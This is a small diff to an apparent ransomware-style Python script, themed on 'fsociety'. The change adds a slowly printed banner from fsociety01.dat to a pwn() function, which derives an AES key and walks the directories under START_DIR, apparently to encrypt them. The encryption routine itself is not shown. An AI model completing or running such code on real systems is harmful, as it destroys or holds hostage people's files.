@@ -1,6 +1,7 @@
 #!/usr/local/bin/python3
 
 import os
+import time
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
 from Crypto import Random
@@ -62,6 +63,10 @@ def gen_key(salt):
 
 
 def pwn():
+    f = open('fsociety01.dat', 'r')
+    for line in f:
+        time.sleep(0.03)
+        print(line, end='')
     key = gen_key(SALT)
     dirs = next(os.walk(START_DIR))[1]
     for dir in dirs:
